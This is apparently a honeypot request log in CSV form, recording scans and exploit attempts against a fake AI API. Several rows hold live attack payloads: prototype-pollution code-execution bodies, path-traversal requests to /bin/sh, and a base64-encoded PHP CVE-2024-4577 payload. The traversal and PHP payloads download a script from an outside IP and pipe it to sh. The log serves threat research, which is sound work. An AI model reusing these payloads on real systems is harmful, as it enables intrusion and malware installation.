request_id,timestamp_utc,client_ip,method,path,host,user_agent,x_forwarded_for,request_body_size,response_body_size,stream_chunk_count,model,user_content_flat,request_body_text,response_status,response_reason,response_body_text,duration_ms,error
e4f9a6f6-4131-4523-ad37-e028a8e6d7db,2026-04-02T16:55:56.396279+00:00,anon_b4f581ec,GET,/index.php,[honeypot-host],libredtail-http,,0,316,1,,,,404,Not Found,"{""error"": ""Endpoint not found"", ""message"": ""Use POST /v1/chat/completions or POST /v1/responses for interactive model access."", ""hint"": ""Developer preview clients may inspect /v1/files and /.well-known/ai-plugin.json first, then use /v1/responses or /v1/chat/completions to request diagnostics or visible guidance.""}",0,
8cdb0400-4f14-410b-a0ff-d372e58f183f,2026-04-02T16:55:57.129577+00:00,anon_b4f581ec,GET,/index.php,[honeypot-host],libredtail-http,,0,316,1,,,,404,Not Found,"{""error"": ""Endpoint not found"", ""message"": ""Use POST /v1/chat/completions or POST /v1/responses for interactive model access."", ""hint"": ""Developer preview clients may inspect /v1/files and /.well-known/ai-plugin.json first, then use /v1/responses or /v1/chat/completions to request diagnostics or visible guidance.""}",0,
d1a4b1b8-33fa-4a46-9e31-0d1d60eb5ba3,2026-04-02T16:55:57.542643+00:00,anon_b4f581ec,GET,/containers/json,[honeypot-host],libredtail-http,,0,316,1,,,,404,Not Found,"{""error"": ""Endpoint not found"", ""message"": ""Use POST /v1/chat/completions or POST /v1/responses for interactive model access."", ""hint"": ""Developer preview clients may inspect /v1/files and /.well-known/ai-plugin.json first, then use /v1/responses or /v1/chat/completions to request diagnostics or visible guidance.""}",0,
9daeccb0-d04e-4ec3-99da-7b87c3ed2e45,2026-04-02T17:57:41.313746+00:00,anon_840f77b4,GET,/,[honeypot-host],Mozilla/5.0 zgrab/0.x,,0,520,1,,,,200,OK,"{""service"": ""openai-compatible-api"", ""status"": ""ready"", ""docs"": [""/v1/models"", ""/v1/chat/completions"", ""/v1/completions"", ""/v1/responses"", ""/v1/files"", ""/openapi.json""], ""capabilities"": [""models"", ""responses"", ""files"", ""plugin-manifest"", ""tool-preview"", ""developer-diagnostics-preview""], ""plugin_manifest"": ""/.well-known/ai-plugin.json"", ""agent_manifest"": ""/.well-known/agent.json"", ""notes"": [""debug preview available"", ""restricted context may be attached to some responses"", ""developer diagnostics partially enabled""]}
",0,
fb19416d-d2f5-4568-b113-5585cdf82ef5,2026-04-02T18:05:08.988774+00:00,anon_05b8fcc5,POST,/,[honeypot-host],"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/134.0.0.0 Safari/537.36",,503,316,1,,"------WebKitFormBoundaryx614384278
Content-Disposition: form-data; name=""0""

{""then"":""$1:__proto__:then"",""status"":""resolved_model"",""reason"":-1,""value"":""{\""then\"":\""$B\""}"",""_response"":{""_prefix"":""r = 16627+true+36951;throw Object.assign(new Error('NEXT_REDIRECT'), {digest:`${r}`});return"",""_formData"":{""get"":""$1:constructor:constructor""}}}
------WebKitFormBoundaryx614384278
Content-Disposition: form-data; name=""1""

""$@0""
------WebKitFormBoundaryx614384278
------WebKitFormBoundaryx614384278--","------WebKitFormBoundaryx614384278
Content-Disposition: form-data; name=""0""

{""then"":""$1:__proto__:then"",""status"":""resolved_model"",""reason"":-1,""value"":""{\""then\"":\""$B\""}"",""_response"":{""_prefix"":""r = 16627+true+36951;throw Object.assign(new Error('NEXT_REDIRECT'), {digest:`${r}`});return"",""_formData"":{""get"":""$1:constructor:constructor""}}}
------WebKitFormBoundaryx614384278
Content-Disposition: form-data; name=""1""

""$@0""
------WebKitFormBoundaryx614384278
------WebKitFormBoundaryx614384278--",404,Not Found,"{""error"": ""Endpoint not found"", ""message"": ""Use POST /v1/chat/completions or POST /v1/responses for interactive model access."", ""hint"": ""Developer preview clients may inspect /v1/files and /.well-known/ai-plugin.json first, then use /v1/responses or /v1/chat/completions to request diagnostics or visible guidance.""}",0,
5354f2c7-9a68-4f2e-8471-ab13759206a5,2026-04-02T18:05:13.830645+00:00,anon_05b8fcc5,POST,/_next,[honeypot-host],"Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/134.0.6998.135 Mobile Safari/537.36",,522,316,1,,"------WebKitFormBoundaryx1403002162069
Content-Disposition: form-data; name=""0""

{""then"":""$1:__proto__:then"",""status"":""resolved_model"",""reason"":-1,""value"":""{\""then\"":\""$B\""}"",""_response"":{""_prefix"":""r = 255814+true+5484462;throw Object.assign(new Error('NEXT_REDIRECT'), {digest:`${r}`});return"",""_formData"":{""get"":""$1:constructor:constructor""}}}
------WebKitFormBoundaryx1403002162069
Content-Disposition: form-data; name=""1""

""$@0""
------WebKitFormBoundaryx1403002162069
------WebKitFormBoundaryx1403002162069--","------WebKitFormBoundaryx1403002162069
Content-Disposition: form-data; name=""0""

{""then"":""$1:__proto__:then"",""status"":""resolved_model"",""reason"":-1,""value"":""{\""then\"":\""$B\""}"",""_response"":{""_prefix"":""r = 255814+true+5484462;throw Object.assign(new Error('NEXT_REDIRECT'), {digest:`${r}`});return"",""_formData"":{""get"":""$1:constructor:constructor""}}}
------WebKitFormBoundaryx1403002162069
Content-Disposition: form-data; name=""1""

""$@0""
------WebKitFormBoundaryx1403002162069
------WebKitFormBoundaryx1403002162069--",404,Not Found,"{""error"": ""Endpoint not found"", ""message"": ""Use POST /v1/chat/completions or POST /v1/responses for interactive model access."", ""hint"": ""Developer preview clients may inspect /v1/files and /.well-known/ai-plugin.json first, then use /v1/responses or /v1/chat/completions to request diagnostics or visible guidance.""}",0,
127fe22e-a6b1-470f-9682-39efb52a6558,2026-04-02T18:05:18.755730+00:00,anon_05b8fcc5,POST,/api,[honeypot-host],"Mozilla/5.0 (iPhone; CPU iPhone OS 17_7 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) CriOS/134.0.6998.99 Mobile/15E148 Safari/604.1",,522,316,1,,"------WebKitFormBoundaryx1821830450563
Content-Disposition: form-data; name=""0""

{""then"":""$1:__proto__:then"",""status"":""resolved_model"",""reason"":-1,""value"":""{\""then\"":\""$B\""}"",""_response"":{""_prefix"":""r = 228142+true+7985511;throw Object.assign(new Error('NEXT_REDIRECT'), {digest:`${r}`});return"",""_formData"":{""get"":""$1:constructor:constructor""}}}
------WebKitFormBoundaryx1821830450563
Content-Disposition: form-data; name=""1""

""$@0""
------WebKitFormBoundaryx1821830450563
------WebKitFormBoundaryx1821830450563--","------WebKitFormBoundaryx1821830450563
Content-Disposition: form-data; name=""0""

{""then"":""$1:__proto__:then"",""status"":""resolved_model"",""reason"":-1,""value"":""{\""then\"":\""$B\""}"",""_response"":{""_prefix"":""r = 228142+true+7985511;throw Object.assign(new Error('NEXT_REDIRECT'), {digest:`${r}`});return"",""_formData"":{""get"":""$1:constructor:constructor""}}}
------WebKitFormBoundaryx1821830450563
Content-Disposition: form-data; name=""1""

""$@0""
------WebKitFormBoundaryx1821830450563
------WebKitFormBoundaryx1821830450563--",404,Not Found,"{""error"": ""Endpoint not found"", ""message"": ""Use POST /v1/chat/completions or POST /v1/responses for interactive model access."", ""hint"": ""Developer preview clients may inspect /v1/files and /.well-known/ai-plugin.json first, then use /v1/responses or /v1/chat/completions to request diagnostics or visible guidance.""}",0,
2657dccd-8e93-4b95-bc6f-e71814997463,2026-04-02T18:05:23.327562+00:00,anon_05b8fcc5,POST,/_next/server,[honeypot-host],"Mozilla/5.0 (iPhone; CPU iPhone OS 17_7 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) CriOS/134.0.6998.99 Mobile/15E148 Safari/604.1",,513,316,1,,"------WebKitFormBoundaryx90086424269
Content-Disposition: form-data; name=""0""

{""then"":""$1:__proto__:then"",""status"":""resolved_model"",""reason"":-1,""value"":""{\""then\"":\""$B\""}"",""_response"":{""_prefix"":""r = 200692+true+448879;throw Object.assign(new Error('NEXT_REDIRECT'), {digest:`${r}`});return"",""_formData"":{""get"":""$1:constructor:constructor""}}}
------WebKitFormBoundaryx90086424269
Content-Disposition: form-data; name=""1""

""$@0""
------WebKitFormBoundaryx90086424269
------WebKitFormBoundaryx90086424269--","------WebKitFormBoundaryx90086424269
Content-Disposition: form-data; name=""0""

{""then"":""$1:__proto__:then"",""status"":""resolved_model"",""reason"":-1,""value"":""{\""then\"":\""$B\""}"",""_response"":{""_prefix"":""r = 200692+true+448879;throw Object.assign(new Error('NEXT_REDIRECT'), {digest:`${r}`});return"",""_formData"":{""get"":""$1:constructor:constructor""}}}
------WebKitFormBoundaryx90086424269
Content-Disposition: form-data; name=""1""

""$@0""
------WebKitFormBoundaryx90086424269
------WebKitFormBoundaryx90086424269--",404,Not Found,"{""error"": ""Endpoint not found"", ""message"": ""Use POST /v1/chat/completions or POST /v1/responses for interactive model access."", ""hint"": ""Developer preview clients may inspect /v1/files and /.well-known/ai-plugin.json first, then use /v1/responses or /v1/chat/completions to request diagnostics or visible guidance.""}",0,
bac6edf1-04a2-475f-ad0d-13610fc35dc4,2026-04-02T18:05:27.928007+00:00,anon_05b8fcc5,POST,/app,[honeypot-host],"Mozilla/5.0 (X11; CrOS x86_64 14541.0.0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/134.0.0.0 Safari/537.36",,513,316,1,,"------WebKitFormBoundaryx74919039989
Content-Disposition: form-data; name=""0""

{""then"":""$1:__proto__:then"",""status"":""resolved_model"",""reason"":-1,""value"":""{\""then\"":\""$B\""}"",""_response"":{""_prefix"":""r = 274481+true+272948;throw Object.assign(new Error('NEXT_REDIRECT'), {digest:`${r}`});return"",""_formData"":{""get"":""$1:constructor:constructor""}}}
------WebKitFormBoundaryx74919039989
Content-Disposition: form-data; name=""1""

""$@0""
------WebKitFormBoundaryx74919039989
------WebKitFormBoundaryx74919039989--","------WebKitFormBoundaryx74919039989
Content-Disposition: form-data; name=""0""

{""then"":""$1:__proto__:then"",""status"":""resolved_model"",""reason"":-1,""value"":""{\""then\"":\""$B\""}"",""_response"":{""_prefix"":""r = 274481+true+272948;throw Object.assign(new Error('NEXT_REDIRECT'), {digest:`${r}`});return"",""_formData"":{""get"":""$1:constructor:constructor""}}}
------WebKitFormBoundaryx74919039989
Content-Disposition: form-data; name=""1""

""$@0""
------WebKitFormBoundaryx74919039989
------WebKitFormBoundaryx74919039989--",404,Not Found,"{""error"": ""Endpoint not found"", ""message"": ""Use POST /v1/chat/completions or POST /v1/responses for interactive model access."", ""hint"": ""Developer preview clients may inspect /v1/files and /.well-known/ai-plugin.json first, then use /v1/responses or /v1/chat/completions to request diagnostics or visible guidance.""}",0,
36462def-9d07-44ab-a315-b9d7122b5d8a,2026-04-02T18:05:32.481058+00:00,anon_05b8fcc5,POST,/api/route,[honeypot-host],"Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/134.0.6998.135 Mobile Safari/537.36",,518,316,1,,"------WebKitFormBoundaryx338460962479
Content-Disposition: form-data; name=""0""

{""then"":""$1:__proto__:then"",""status"":""resolved_model"",""reason"":-1,""value"":""{\""then\"":\""$B\""}"",""_response"":{""_prefix"":""r = 148303+true+2282226;throw Object.assign(new Error('NEXT_REDIRECT'), {digest:`${r}`});return"",""_formData"":{""get"":""$1:constructor:constructor""}}}
------WebKitFormBoundaryx338460962479
Content-Disposition: form-data; name=""1""

""$@0""
------WebKitFormBoundaryx338460962479
------WebKitFormBoundaryx338460962479--","------WebKitFormBoundaryx338460962479
Content-Disposition: form-data; name=""0""

{""then"":""$1:__proto__:then"",""status"":""resolved_model"",""reason"":-1,""value"":""{\""then\"":\""$B\""}"",""_response"":{""_prefix"":""r = 148303+true+2282226;throw Object.assign(new Error('NEXT_REDIRECT'), {digest:`${r}`});return"",""_formData"":{""get"":""$1:constructor:constructor""}}}
------WebKitFormBoundaryx338460962479
Content-Disposition: form-data; name=""1""

""$@0""
------WebKitFormBoundaryx338460962479
------WebKitFormBoundaryx338460962479--",404,Not Found,"{""error"": ""Endpoint not found"", ""message"": ""Use POST /v1/chat/completions or POST /v1/responses for interactive model access."", ""hint"": ""Developer preview clients may inspect /v1/files and /.well-known/ai-plugin.json first, then use /v1/responses or /v1/chat/completions to request diagnostics or visible guidance.""}",0,
b6f7d0e8-980b-4c0b-bd51-82ba0ab33b9c,2026-04-02T18:32:44.043435+00:00,anon_e6650463,GET,/.env,[honeypot-host],"Mozilla/5.0 (X11; U; Linux x86_64; en-us) AppleWebKit/534.35 (KHTML, like Gecko) Chrome/11.0.696.65 Safari/534.35 Puffin/2.9174AT",,0,316,1,,,,404,Not Found,"{""error"": ""Endpoint not found"", ""message"": ""Use POST /v1/chat/completions or POST /v1/responses for interactive model access."", ""hint"": ""Developer preview clients may inspect /v1/files and /.well-known/ai-plugin.json first, then use /v1/responses or /v1/chat/completions to request diagnostics or visible guidance.""}",0,
7f8a9a15-f700-48c2-b18f-7c29d25f9781,2026-04-02T18:48:03.735139+00:00,anon_b93fde94,POST,/cgi-bin/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/bin/sh,[honeypot-host],libredtail-http,,119,316,1,,(wget --no-check-certificate -qO- https://31.57.216.121/sh || curl -sk https://31.57.216.121/sh) | sh -s apache.selfrep,(wget --no-check-certificate -qO- https://31.57.216.121/sh || curl -sk https://31.57.216.121/sh) | sh -s apache.selfrep,404,Not Found,"{""error"": ""Endpoint not found"", ""message"": ""Use POST /v1/chat/completions or POST /v1/responses for interactive model access."", ""hint"": ""Developer preview clients may inspect /v1/files and /.well-known/ai-plugin.json first, then use /v1/responses or /v1/chat/completions to request diagnostics or visible guidance.""}",0,
957c526b-c5d1-4ffa-bdf9-41465c6abdf8,2026-04-02T18:48:04.222097+00:00,anon_b93fde94,POST,/cgi-bin/%%32%65%%32%65/%%32%65%%32%65/%%32%65%%32%65/%%32%65%%32%65/%%32%65%%32%65/%%32%65%%32%65/%%32%65%%32%65/bin/sh,[honeypot-host],libredtail-http,,119,316,1,,(wget --no-check-certificate -qO- https://31.57.216.121/sh || curl -sk https://31.57.216.121/sh) | sh -s apache.selfrep,(wget --no-check-certificate -qO- https://31.57.216.121/sh || curl -sk https://31.57.216.121/sh) | sh -s apache.selfrep,404,Not Found,"{""error"": ""Endpoint not found"", ""message"": ""Use POST /v1/chat/completions or POST /v1/responses for interactive model access."", ""hint"": ""Developer preview clients may inspect /v1/files and /.well-known/ai-plugin.json first, then use /v1/responses or /v1/chat/completions to request diagnostics or visible guidance.""}",0,
566f1239-b3c1-4327-afdf-7029e47adde8,2026-04-02T18:48:04.660561+00:00,anon_b93fde94,POST,/hello.world,[honeypot-host],libredtail-http,,241,316,1,,"<?php shell_exec(base64_decode(""KHdnZXQgLS1uby1jaGVjay1jZXJ0aWZpY2F0ZSAtcU8tIGh0dHBzOi8vMzEuNTcuMjE2LjEyMS9zaCB8fCBjdXJsIC1zayBodHRwczovLzMxLjU3LjIxNi4xMjEvc2gpIHwgc2ggLXMgY3ZlXzIwMjRfNDU3Ny5zZWxmcmVw"")); echo(md5(""Hello CVE-2024-4577"")); ?>","<?php shell_exec(base64_decode(""KHdnZXQgLS1uby1jaGVjay1jZXJ0aWZpY2F0ZSAtcU8tIGh0dHBzOi8vMzEuNTcuMjE2LjEyMS9zaCB8fCBjdXJsIC1zayBodHRwczovLzMxLjU3LjIxNi4xMjEvc2gpIHwgc2ggLXMgY3ZlXzIwMjRfNDU3Ny5zZWxmcmVw"")); echo(md5(""Hello CVE-2024-4577"")); ?>",404,Not Found,"{""error"": ""Endpoint not found"", ""message"": ""Use POST /v1/chat/completions or POST /v1/responses for interactive model access."", ""hint"": ""Developer preview clients may inspect /v1/files and /.well-known/ai-plugin.json first, then use /v1/responses or /v1/chat/completions to request diagnostics or visible guidance.""}",0,
188f5574-7e0e-46ce-9c59-92524f31c276,2026-04-02T18:48:04.827178+00:00,anon_b93fde94,POST,/,[honeypot-host],libredtail-http,,241,316,1,,"<?php shell_exec(base64_decode(""KHdnZXQgLS1uby1jaGVjay1jZXJ0aWZpY2F0ZSAtcU8tIGh0dHBzOi8vMzEuNTcuMjE2LjEyMS9zaCB8fCBjdXJsIC1zayBodHRwczovLzMxLjU3LjIxNi4xMjEvc2gpIHwgc2ggLXMgY3ZlXzIwMjRfNDU3Ny5zZWxmcmVw"")); echo(md5(""Hello CVE-2024-4577"")); ?>","<?php shell_exec(base64_decode(""KHdnZXQgLS1uby1jaGVjay1jZXJ0aWZpY2F0ZSAtcU8tIGh0dHBzOi8vMzEuNTcuMjE2LjEyMS9zaCB8fCBjdXJsIC1zayBodHRwczovLzMxLjU3LjIxNi4xMjEvc2gpIHwgc2ggLXMgY3ZlXzIwMjRfNDU3Ny5zZWxmcmVw"")); echo(md5(""Hello CVE-2024-4577"")); ?>",404,Not Found,"{""error"": ""Endpoint not found"", ""message"": ""Use POST /v1/chat/completions or POST /v1/responses for interactive model access."", ""hint"": ""Developer preview clients may inspect /v1/files and /.well-known/ai-plugin.json first, then use /v1/responses or /v1/chat/completions to request diagnostics or visible guidance.""}",0,
23d26668-114f-4279-9f91-c348415af4ac,2026-04-02T18:48:05.989880+00:00,anon_b93fde94,GET,/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php,[honeypot-host],libredtail-http,,0,316,1,,,,404,Not Found,"{""error"": ""Endpoint not found"", ""message"": ""Use POST /v1/chat/completions or POST /v1/responses for interactive model access."", ""hint"": ""Developer preview clients may inspect /v1/files and /.well-known/ai-plugin.json first, then use /v1/responses or /v1/chat/completions to request diagnostics or visible guidance.""}",0,
1bb2efec-af9c-488e-8d65-10e357f0f75b,2026-04-02T18:48:07.805980+00:00,anon_b93fde94,GET,/vendor/phpunit/phpunit/Util/PHP/eval-stdin.php,[honeypot-host],libredtail-http,,0,316,1,,,,404,Not Found,"{""error"": ""Endpoint not found"", ""message"": ""Use POST /v1/chat/completions or POST /v1/responses for interactive model access."", ""hint"": ""Developer preview clients may inspect /v1/files and /.well-known/ai-plugin.json first, then use /v1/responses or /v1/chat/completions to request diagnostics or visible guidance.""}",0,
